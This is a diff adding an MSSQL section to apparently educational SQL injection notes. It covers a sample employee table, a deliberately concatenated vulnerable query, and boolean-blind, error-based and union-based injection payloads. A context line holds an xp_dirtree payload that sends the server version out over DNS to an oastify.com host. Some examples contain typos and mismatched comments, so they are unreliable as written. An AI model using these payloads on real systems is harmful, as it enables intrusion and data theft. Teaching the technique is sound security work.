@@ -121,6 +121,176 @@ allllcs' OR SUBSTRING(CURRENT_USER,1,3)='DBO';--
 ');declare @q varchar(200);set @q='\\fj2meelkqbazaz61dntl0yzycpih69uy.'+(SELECT SUBSTRING(@@version,1,9))+'.oasti'+'fy.com\huh'; exec master.dbo.xp_dirtree @q;--
 ```
 
+***
+
+**Sample Database**
+
+```
+Database name: ChristmasInc
+Database table: employee
+
+SELECT * FROM employee;
+
++--------------+------------------------+---------------------------+----------------+
+| emp_id (int) | emp_name (varchar(30)) | emp_position (varchar(10))| emp_dob (date) |
++--------------+------------------------+---------------------------+----------------+
+| 1            | Ann                    | IT                        |  09-06-1998    |
++--------------+------------------------+---------------------------+----------------+
+| 2            | Santa Claus            | CEO                       |  24-12-1978    |
++--------------+------------------------+---------------------------+----------------+
+| 3            | Mr Reindeer            | HR                        |  16-03-1968    |
++--------------+------------------------+---------------------------+----------------+
+| 4            | Snow Man               | Admin                     |  01-02-1982    |
++--------------+------------------------+---------------------------+----------------+
+```
+
+**Vulnerable SQL Statement**
+
+```
+sqlquery = "SELECT * FROM employee WHEN emp_name LIKE '%" + userinput + "%' ORDERY BY emp_id;"
+userinput = "an"
+
+# complete query
+# SELECT * FROM employee WHERE emp_name LIKE '%an%' ORDER BY emp_id;
+
++--------+-------------+--------------+-------------+
+| emp_id | emp_name    | emp_position | emp_dob     |
++--------+-------------+--------------+-------------+
+| 1      | Ann         | IT           |  09-06-1998 |
++--------+-------------+--------------+-------------+
+| 2      | Santa Claus | CEO          |  24-12-1978 |
++--------+-------------+--------------+-------------+
+| 4      | Snow Man    | Admin        |  01-02-1982 |
++--------+-------------+--------------+-------------+
+```
+
+#### Boolean-based Blind SQLi
+
+When a true or false condition is present, result will be shown when a true statement is returned. To extract information in a boolean-based blind SQLi, use the LEN() and SUBSTRING() function.
+
+> LEN() returns the number of characters of the specified string expression, excluding trailing spaces.
+
+> SUBSTRING() returns part of a character, binary, text, or image expression in SQL Server.
+
+**Example**
+
+Use the LEN() function to find how many character the database name present:
+
+```
+userinput = "' OR LEN(db_name())=1;--"
+# returns false, no data is retrieved:
+SELECT * FROM employee WHERE emp_name LIKE '%' AND LEN(db_name())=1;--%' ORDER BY emp_id;
+
+userinput = "' OR LEN(db_name())=2;--"
+# returns false, no data is retrieved:
+SELECT * FROM employee WHERE emp_name LIKE '%' AND LEN(db_name())=2;--%' ORDER BY emp_id;
+
+...
+
+userinput = "' OR LEN(db_name())=12;--"
+# returns true, data is returned:
+SELECT * FROM employee WHERE emp_name LIKE '%' AND LEN(db_name())=12;--%' ORDER BY emp_id;
+```
+
+Use the SUBSTRING() function to find each character of the database name:
+
+```
+# check if the first letter of the database name is A:
+userinput = "' AND SUBSTRING(db_name(),1,1)='A';--"
+# returns FALSE, no data is retrieved:
+SELECT * FROM employee WHERE emp_name LIKE '%' AND SUBSTRING(db_name(),1,1)='A';--%' ORDER BY emp_id;
+
+# check if the first letter of the database name is B:
+userinput = "' AND SUBSTRING(db_name(),1,1)='B';--"
+# returns FALSE, no data is retrieved:
+SELECT * FROM employee WHERE emp_name LIKE '%' AND SUBSTRING(db_name(),1,1)='B';--%' ORDER BY emp_id;
+
+# check if the first letter of the database name is C:
+userinput = "' AND SUBSTRING(db_name(),1,1)='C';--"
+# returns TRUE, data is returned:
+SELECT * FROM employee WHERE emp_name LIKE '%' AND SUBSTRING(db_name(),1,1)='C';--%' ORDER BY emp_id;
+
+...
+
+# check if the 5th letter of the database name is s:
+userinput = "' AND SUBSTRING(db_name(),1,5)='Chris';--"
+# returns TRUE, data is returned:
+SELECT * FROM employee WHERE emp_name LIKE '%' AND SUBSTRING(db_name(),1,5)='Chris';--%' ORDER BY emp_id;
+
+...
+
+# check if the 12th letter of the database name is c:
+userinput = "' AND SUBSTRING(db_name(),1,12)='ChristmasInc';--"
+# returns TRUE, data is returned:
+SELECT * FROM employee WHERE emp_name LIKE '%' AND SUBSTRING(db_name(),1,12)='ChristmasInc';--%' ORDER BY emp_id;
+```
+
+***
+
+#### Error-based SQLi
+
+When a misconfigured database outputs SQL error message to the user, an error-based SQLi is possible. The malicious user may insert a payload to trigger an intentional error to grab the desired output.
+
+**Example**
+
+Attempting to convert a VARCHAR value into INT will trigger a SQL Error:
+
+```
+userinput = "' AND 1=CONVERT(INT,@@version);--"
+# complete query
+SELECT * FROM employee WHERE emp_name LIKE '%' AND 1=CONVERT(INT,@@version);--%' ORDER BY emp_id;
+```
+
+Error message with the desired output:
+
+<figure><img src="https://cdn-images-1.medium.com/max/1000/1*K--cEzSuukmkyOuURzVt7g.png" alt=""><figcaption></figcaption></figure>
+
+***
+
+#### Union-based SQLi
+
+Union-based SQLi can be used to retrieve data from other table by extending the original SQL query.&#x20;
+
+There are a few conditions to be met for a union query to work:&#x20;
+
+Firstly, a union query require the same number of column on both side. Therefore, in order to perform a union-based SQLi, we first need to find the number of columns used in the syntax.&#x20;
+
+Secondly, the columns on both side must have the same data type.
+
+**Condition 1 (Number of columns)**
+
+Number of columns for the first table and the second must be the same:
+
+```
+# Number of columns on both side are different, statement invalid:
+SELECT column1, column2, column3 FROM table1 UNION ALL SELECT columnX FROM table2;
+
+# Number of columns on both side are different, statement invalid:
+SELECT column1, column2, column3 FROM table1 UNION ALL SELECT columnX, columnY FROM table2;
+
+# Number of columns on both side matches, statement is valid:
+SELECT column1, column2, column3 FROM table1 UNION ALL SELECT columnX, columnY, columnZ FROM table2;
+```
+
+**Condition 2 (Same data type)**
+
+The data type of each relative column must be the same:
+
+```
+# Data type of columns1 and columnX is different, statement invalid:
+SELECT column1(int) FROM table1 UNION ALL SELECT columnX(date) FROM table2;
+
+# Data type of columns3 and columnZ is different, statement invalid:
+SELECT column1(int), column2(date), column3(varchar) FROM table1 UNION ALL SELECT columnX(int), columnY(date), columnZ(blob) FROM table2;
+
+# Data type of all columns from table1 and table 2 are the same , statement is valid:
+SELECT column1(int), column2(date), column3(varchar) FROM table1 UNION ALL SELECT columnX(int), columnY(date), columnZ(varchar) FROM table2;
+```
+
+#### Time-based Blind SQLi
+
+> A time-based blind SQL injection attack is a type of attack in which the attacker sends a malicious SQL query to a database and measures the time it takes for the database to respond. By repeatedly sending these types of queries and measuring the response times, the attacker can infer information about the database, such as the names of tables or fields, or even the data stored in those tables. This technique can be used to extract sensitive data from the database or to modify the data in the database.
+
 ## PostgreSQL
 
 ```
